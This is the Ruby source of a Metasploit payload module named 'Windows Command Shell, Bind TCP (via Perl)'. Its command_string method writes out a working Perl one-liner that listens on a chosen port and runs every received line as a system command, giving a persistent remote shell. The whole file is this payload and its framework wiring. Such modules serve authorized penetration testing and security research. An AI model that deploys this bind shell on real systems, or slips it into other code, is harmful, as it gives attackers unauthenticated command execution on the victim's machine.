##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 139

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Command Shell, Bind TCP (via Perl)',
      'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent)',
      'Author'        => ['Samy <samy[at]samy.pl>', 'cazz', 'aushack'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'perl',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
    register_options([
      OptString.new('PERL_PATH', [true, 'The path to Perl interpreter', 'perl'])
    ])
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string

    cmd = "#{datastore['PERL_PATH']} -MIO -e \"while($c=new IO::Socket::INET(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}\""

    return cmd
  end
end
